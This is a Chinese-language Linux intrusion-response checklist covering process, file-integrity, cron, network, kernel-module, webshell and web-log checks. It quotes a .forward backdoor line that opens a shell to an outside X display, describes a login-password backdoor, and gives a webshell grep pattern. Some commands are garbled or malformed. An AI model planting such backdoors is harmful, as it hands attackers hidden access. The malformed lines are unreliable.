  一般被入侵的服务器都会运行一些恶意程序，或是挖矿程序，或者DDOS程序等等，如果程序运行着，那么通过查看进程可以发现一些信息。
  如一般的反弹shell，核心是将bash的标准输入和标准输出都绑定到了socket fd 上，故 lsof -p pid 如果看到某bash 进程的0 1 绑定在tcp:socket 上，就是有问题的。简单通过 bash -i 来判断是否反弹shell，可能导致误报，如 /usr/bin/script脚本的作用是用于存储每个SESSION的工作，只有在远程连接中的情况下才会被执行，默认执行就会启动 bash -i。  
### 普通进程
ps -aux  查看进程
top 查看进程
lsof -p pid  查看进程所打开的端口及文件
lsof -c 进程名  查看关联文件
ps -aux | grep python | cut -d ' ' -f 2 | xargs kill 杀死python相关的进程
检查/etc/inetd.conf文件，输入：cat /etc/inetd.conf | grep –v "^#"，输出的信息就是你这台机器所开启的远程服务。
lsof -i TCP -nP |grep -E 'LISTEN|ESTABLISHED' vs ss -napt 的输出对比
![ss](../pictures/ss_napt.png)
如果进程中没有发现异常，那么可以看看有没有开启某些隐藏进程。
### 隐藏进程
ps -ef | awk '{print}' | sort -n | uniq >1
ls /proc | sort -n |uniq >2
diff 1 2
注：以上3个步骤为检查隐藏进程。
## 检查文件
被入侵的网站，通常肯定有文件被改动，那么可以通过比较文件创建时间、完整性、文件路径等方式查看文件是否被改动。
find / -uid 0 -print 查找特权用户文件
find / -size +10000k -print 查找大于10000k的文件
find / -name "…" -print 查找用户名为 … 的文件
find / -name core -exec ls -l {} \; 查找core文件，并列出详细信息
md5sum -b filename 查看文件的md5值
rpm -qf /bin/ls 检查文件的完整性（还有其它/bin目录下的文件）
whereis 文件名 查看文件路径
ls -al 文件名 查看文件创建时间（包括 . 开头的隐藏文件，注意看一些目录下如/var/tmp下面是否放一些提权工具，命名为 .. 之类）
du -sh 文件名 查看文件大小
## 检查系统文件完整性
检查文件的完整性有多种方法，通常我们通过输入ls –l 文件名来查询和比较文件，这种方法虽然简单，但还是有一定的实用性。但是如果ls文件都已经被替换了就比较麻烦。在LINUX下可以用rpm –V `rpm –qf 文件名` 来查询，国家查询的结果是否正常来判断文件是否完整。在LINUX下使用rpm来检查文件的完整性的方法也很多，这里不一一赘述，可以man rpm来获得更多的格式。  
UNIX系统中，/bin/login是被入侵者经常替换作为后门的文件，接下来谈一下login后门 ：  
UNIX里，Login程序通常用来对telnet来的用户进行口令验证。入侵者获取login的源代码并修改，使它在比较输入口令与存储口令时先检查后门口令。如果用户敲入后门口令，它将忽视管理员设置的口令让你长驱直入：这将允许入侵者进入任何账号，甚至是root目录。由于后门口令是在用户真实登录并被日志记录到utmp和wtmP前产生的一个访问，所以入侵者可以登录获取shell却不会暴露该账号。  
管理员注意到这种后门后，使用”strings”命令搜索login程序以寻找文本信息。许多情况下后门口令会原形毕露。入侵者又会开始加密或者更改隐藏口令，使strings命令失效。所以许多管理员利用MD5校验和检测这种后门。UNIX系统中有md5sum命令，输入md5sum 文件名检查该文件的md5签名。它的使用格式如下：md5sum –b 使用二进制方式阅读文件；md5sum –c 逆向检查MD5签名；md5sum –t 使用文本方式阅读文件。  
在前面提到过守护进程，对于守护进程配置文件inetd.conf中没有被注释掉的行要进行仔细比较，举个简单的例子，如果你开放了telnet服务，守护进程配置文件中就会有一句：`telnet stream tcp nowait root /usr/sbin/in.telnetd in.telnetd`  
可以看到它所使用的文件是 /usr/sbin/in.telnetd，检查该文件的完整性，入侵者往往通过替换守护进程中允许的服务文件来为自己创建一个后门。  
LINUX系统中的/etc/crontab也是经常被入侵者利用的一个文件，检查该文件的完整性，可以直接cat /etc/crontab，仔细阅读该文件有没有被入侵者利用来做其他的事情。  
不替换login等文件而直接使用进程来启动后门的方法有一个缺陷，即系统一旦重新启动，这个进程就被杀死了，所以得让这个后门在系统启动的时候也启动起来。通常通过检查/etc/rc.d下的文件来查看系统启动的时候是不是带有后门程序；这个方法怎么有点象查windows下的trojan。  
说到这里，另外提一下，如果在某一目录下发现有属性为这样的文件：-rwsr-xr-x 1 root root xxx .sh，这个表明任何用户进来以后运行这个文件都可以获得一个rootshell，这就是setuid文件。运行 find –perm 4000 –print对此类文件进行全局查找，然后删除这样的文件。  
### RPM check检查
系统完整性也可以通过rpm自带的-Va来校验检查所有的rpm软件包,有哪些被篡改了,防止rpm也被替换,上传一个安全干净稳定版本rpm二进制到服务器上进行检查  
`./rpm -Va > rpm.log`  
如果一切均校验正常将不会产生任何输出。如果有不一致的地方，就会显示出来。输出格式是8位长字符串, c 用以指配置文件, 接着是文件名。 8位字符的每一个用以表示文件与RPM数据库中一种属性的比较结果。 `.` (点) 表示测试通过。 `.` 下面的字符表示对RPM软件包进行的某种测试失败：    
```
5 MD5 校验码
S 文件尺寸
L 符号连接
T 文件修改日期
D 设备
U 用户
G 用户组
M 模式e (包括权限和文件类型)
```  
借用sobug文章案例：如下图可知ps, pstree, netstat, sshd等等系统关键进程被篡改了。  
![](./pictures/rpmcheck.png)  
## 检查网络
检查网络的目的，是查看黑客是否通过篡改网卡类型，进行流量嗅探等操作。
ip link | grep PROMISC 正常网卡不应该存在promisc，如果存在可能有sniffer
lsof -i
netstat -nap 查看不正常端口
arp -a 查看arp记录是否正常
ifconfig -a 查看网卡设置
通过端口号查询监听的进程，-i4 表示ipv4   
`lsof -Pnl +M -i4 | grep 2222`  
## 检查计划任务
当我们尝试kill恶意程序时，往往会遇到被kill程序自动启动的问题，那么就要检查下计划任务(cron)了。  
/var/spool/cron/username 是用户 username 定义的任务所在的文件，有些黑客喜欢用bin 用户。  
a) 通过crontabl –l 查看当前的任务计划有哪些，是否有后门木马程序启动相关信息；    
b) 查看etc目录任务计划相关文件，ls /etc/cron*    
查看linux 开机启动程序    
a) 查看rc.local文件（/etc/init.d/rc.local /etc/rc.local）    
b) ls –alt /etc/init.d/    
c) chkconfig    
## 检查系统中的core文件
通过发送畸形请求来攻击服务器的某一服务来入侵系统是一种常规的入侵方法，典型的RPC攻击就是通过这种方式。这种方式有一定的成功率，也就是说它并不能100%保证成功入侵系统，而且通常会在服务器相应目录下产生core文件，全局查找系统中的core文件，输入find / -name core –exec ls –l {} \; 依据core所在的目录、查询core文件来判断是否有入侵行为。
## 检查系统后门
可以使用工具，如：clamAV（病毒库比较难下）、lynis（基础安全检查非常不错）、Conmodo、rkhunter、chkrootkit 等，  
当然也可以手工输入命令检查。
vim $HOME/.ssh/authorized_keys 查看ssh永久链接文件
lsmod 检查内核模块
chkconfig –list/systemctl list-units –type=service 检查自启
查看著名的木门后门程序：
ls /etc/rc.d
ls /etc/rc3.d
find / -name ".rhosts" –print
find / -name ".forward" –print
在某用户的$HOME下，.rhosts文件中仅包含两个+号是非常危险的，如果你的系统上开了513端口（rlogin端口，和telnet作用相同），那么任意是谁都可以用这个用户登录到你的系统上而不需要任何验证。  
Unix下在.forward文件里放入命令是重新获得访问的常用方法，在某一 用户$HOME下的.forward可能设置如下:  
`\username|"/usr/local/X11/bin/xterm -disp hacksys.other.dom:0.0 –e /bin/sh"`  
这种方法的变形包括改变系统的mail的别名文件(通常位于/etc/aliases). 注意这只是一种简单的变换. 更为高级的能够从.forward中运行简单脚本实现在标准输入执行任意命令(小部分预处理后).利用smrsh可以有效的制止这种后门(虽然如果允许可以自运行的elm's filter或procmail类程序, 很有可能还有问题。在Solaris系统下，如果你运行如下命令：  
ln -s /var/mail/luser ~/.forward  
然后设置vacation有效，那么/var/mail/luser就会被拷贝到~/.forward，同时会附加"|/usr/bin/vacation me"，旧的symlink被移到~/.forward..BACKUP中。  
直接删除掉这两个文件也可以。   
## 检查内核级后门
如果你的系统被人安装了这种后门，通常都是比较讨厌的，我常常就在想，遇到这种情况还是重新安装系统算了。  
言归正传，首先，检查系统加载的模块，在LINUX系统下使用lsmod命令，在solaris系统下使用modinfo命令来查看。这里需要说明的是，一般默认安装的LINUX加载的模块都比较少，通常就是网卡的驱动；而solaris下就很多，没别的办法，只有一条一条地去分析。对内核进行加固后，应禁止插入或删除模块，从而保护系统的安全，否则入侵者将有可能再次对系统调用进行替换。我们可以通过替换create_module()和delete_module()来达到上述目的。  
另外，对这个内核进行加固模块时应尽早进行，以防系统调用已经被入侵者替换。如果系统被加载了后门模块，但是在模块列表/proc/module里又看不到它们，有可能是使用了hack工具来移除加载的模块，大名鼎鼎的knark工具包就有移除加载模块的工具。出现这种情况，需要仔细查找/proc目录，根据查找到的文件和经验来判断被隐藏和伪装的进程。Knark后门模块就在/proc/knark目录，当然可能这个目录是隐藏的。  
### 检查网站后门
  如果服务器上运行着web程序，那么需要检查是否通过web漏洞入侵服务器，具体的判断方法可以结合分析中间件日志以及系统日志，但过程需要较长时间。我们也可以通过检查服务器上是否留有入侵者放置的网站后门木马，以此判断黑客是否通过web应用入侵到服务器 [php-malware-finder](https://github.com/nbs-system/php-malware-finder)。
## Webshell查找
​Webshell的排查可以通过文件、流量、日志三种方式进行分析，基于文件的命名特征和内容特征，相对操作性较高，在入侵后应急过程中频率也比较高。可根据webshell特征进行命令查找，简单的可使用(当然会存在漏报和误报)  
```
find /var/www/ -name "*.php" |xargs egrep 'assert|phpspy|c99sh|milw0rm|eval|\(gunerpress|\(base64_decoolcode|spider_bc|shell_exec|passthru|\(\$\_\POST\[|eval \(str_rot13|\.chr\(|\$\{\"\_P|eval\(\$\_R|file_put_contents\(\.\*\$\_|base64_decode'
```
Webshell的排查可以通过Github上存在各种版本的webshell查杀脚本，当然都有自己的特点，可使用河马shell查杀（shellpub.com）    
综上所述，通过chkrootkit 、rkhunter、RPM check、Webshell Check 等手段得出以下应对措施：  
1. 根据进程、连接等信息关联的程序，查看木马活动信息。
2. 假如系统的命令（例如netstat ls 等）被替换，为了进一步排查，需要下载一新的或者从其他未感染的主机拷贝新的命令。
3. 发现可疑可执行的木马文件，不要急于删除，先打包备份一份。
4. 发现可疑的文本木马文件，使用文本工具对其内容进行分析，包括回连IP地址、加密方式、关键字（以便扩大整个目录的文件特征提取）等。
## 应用类
Apache、tomcat、Nginx、IIS  
无论任何web服务器其实日志需要关注的东西是一致的，即access_log和error_log。一般在确定ip地址后，通过:  
`find . access_log |grep xargs ip攻击地址`  
`find . access_log| grep xargs 木马文件名`  
页面访问排名前十的IP   
`cat access.log | cut -f1 -d " " | sort | uniq -c | sort -k 1 -r | head -10`   
页面访问排名前十的URL  
`cat access.log | cut -f4 -d " " | sort | uniq -c | sort -k 1 -r | head -10`  
查看最耗时的页面  
`cat access.log | sort -k 2 -n -r | head 10`  
在对WEB日志进行安全分析时，可以按照下面两种思路展开，逐步深入，还原整个攻击过程。  
首先确定受到攻击、入侵的时间范围，以此为线索，查找这个时间范围内可疑的日志，进一步排查，最终确定攻击者，还原攻击过程。  
![](../pictures/linuxintruderdefen9.jpg)  
一般攻击者在入侵网站后，通常会上传一个后门文件，以方便自己以后访问。我们也可以以该文件为线索来展开分析。  
![](../pictures/linuxintruderdefen10.jpg)  